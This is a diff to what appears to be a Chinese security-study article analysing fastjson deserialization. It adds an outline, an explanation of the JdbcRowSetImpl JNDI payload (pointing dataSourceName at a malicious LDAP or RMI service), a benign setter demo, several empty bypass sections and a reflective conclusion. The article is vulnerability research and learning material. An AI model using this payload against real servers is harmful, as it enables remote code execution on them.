@@ -12,6 +12,19 @@
     * 多态？（反序列化的危险类是要反序列化对象属性的子类或父类）
   * 看看JSONObject的动态代理
 
+### 前言
+
+这篇文章包含如下内容：
+
+* fastjson的介绍
+* fastjson反序列化过程分析：这一部分基本是代码调试到哪写到哪，没有做一个调用关系图，所以看起来会比较乱。建议读者自己调试一下反序列化过程，调试的时候可以把这部分的内容当做一点参考，更加便于自己理解。
+* fastjson常见利用链和Payload的分析
+* fastjson全版本补丁和绕过分析
+* 渗透测试中如何探测json库
+* 渗透测试中如何探测fastjson的版本
+* 渗透测试如何利用fastjson服务器信息
+* fastjson相关的工具介绍与使用
+* 个人的一点学习心得
 
 ### fastjson的基本使用
 
@@ -652,13 +665,82 @@ fastjson的反序列化过程和java原生反序列化过程是不一样的，�
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:389/obj","autoCommit":true}
 ```
 
+这里`dataSourceName`可以用`ldap`也可以用`rmi`，指向一个恶意服务
+
 **分析**
 
 这条链比较简答，fastjson对于`autoCommit`的触发也是比较简单明了的，我们还是分析一下为什么json字符串为何要如此构造。初看到这个Payload，`dataSourceName`是比较引人注意的，因为`JdbcRowSetImpl`及其父类中是没有这个属性的。回忆之前的分析，fastjson在`JavaBeanInfo#build()`中是可以获取到相应的反序列化器的，反序列化器中包含`setDataSourceName()`这个方法，后续在序列化类的属性时，如果有相应的反序列化器，是使用的反序列化器来进行反序列化，而没有直接通过属性设置。fastjson要从json字符串中取得`setDataSourceName()`参数的值，根据之前的分析其实可以得知，fastjson会尝试从json中取得与方法名对应的`dataSourceName`，所以这里的json字符串用到的是`dataSourceName`。
 
 到这，发现对fastjson的理解有一定的偏差，json字符串中的并不一定是属性，而是优先表示在反序列化过程中调用同名的`set`或`get`方法。
 
-这里再给一个
+这里再给一个例子理解上述说法：
+
+```java
+public class TestSet {
+    private int a;
+    private int b;
+    private int c;
+    public TestSet() {
+        this.a = 0;
+        this.b = 0;
+        this.c = 0;
+    }
+    public void setAbc(int a) {
+        System.out.println("setAbc:"+a);
+        this.a = 1;
+        this.b = 1;
+        this.c = 1;
+    }
+
+}
+```
+
+```java
+import java.lang.reflect.Field;
+
+public class Test {
+    public static void main(String[] args) throws IllegalAccessException {
+        String serJson1 = "{\"@type\":\"org.example.TestSet\",\"abc\":\"666\"}";
+        TestSet testSet1 = (TestSet) JSON.parse(serJson1);
+        Class<?> clazz = testSet1.getClass();
+
+        // 获取当前类的属性和值
+        Field[] fields = clazz.getDeclaredFields();
+        for (Field field : fields) {
+            field.setAccessible(true);
+            System.out.println("属性名: " + field.getName() + ", 值: " + field.get(testSet1));
+        }
+    }
+}
+```
+
+运行结果如下：
+
+![image-20250113162031831](./images/image-20250113162031831.png)
+
+#### 补充分析
+
+  本来写完前面的内容，感觉后面的东西不多了，但是梳理了一下fastjson后续的补丁和针对补丁的绕过，绷不住了。由于一个个版本分析实在遭不住，这里补充分析一下三点和安全紧密相关的内容，后续到具体版本就不再具体分析了。
+
+##### fastjson autoType的设置
+
+  在<=Fastjson 1.2.24时是默认开启autoType的，在之后
+
+##### fastjson黑名单机制和绕过
+
+##### fastjson缓存机制和利用
+
+##### loadClass的特性
+
+#### 1.2.25<=Fastjson<=1.2.41
+
+**修复**：1. 添加黑名单，不允许一些类反序列化；2. 默认关闭autoType
+
+##### 在开启autoType的情况下绕过黑名单
+
+##### 绕过autoType和黑名单
+
+### 补充一下其他利用链
 
 
 
@@ -668,6 +750,12 @@ fastjson的反序列化过程和java原生反序列化过程是不一样的，�
 
 #### fastjson关键版本探测
 
+#### 服务器环境探测
+
 ### 工具
 
-#### 
+### 总结
+
+  这篇文章写了很久，前前后后可能有两个月的时间，这段时间我常常在想，对于漏洞的学习应该是怎么样的，什么时候应该浅尝辄止做个复现即可，什么时候该深究其产生原理。就这篇文章来说，是什么支撑我写完它呢？从功利的角度来说，fastjson是前两年比较火影响也比较大的漏洞，它可能会在下一次面试中被问到。但更重要的是，我在研究其原理的过程中学习了很多利用链，了解到了更多姿势，加深了我对于反序列化的理解，而且在调试程序的过程中也提升了java代码能力阅读，这是符合我要提升java安全能力的需求的。虽然fastjson反序列化漏洞可能在今后的实战中越来越少，但是伴随研究漏洞所学习到的其他知识，在今后的漏洞复现、漏洞挖掘对我会有很大帮助。
+
+  清楚了我为什么能够写完这篇文章，我也可以尝试着回答一下漏洞该怎么学了？首先明确一下，它是否符合自己的学习方向，比如目前在搞java安全，就没必要去分析二进制的洞了，渗透要用或者遇到了，拿现成的工具和payload简单复现一下即可；我们还要看一下这个漏洞是否具有启发性，研究它能否对我们挖掘新漏洞有帮助，比如最近很火的Tomcat条件竞争文件上传，条件竞争+文件上传这是以前比较少见的，就比一般的CMS的文件上传有分析价值的多。
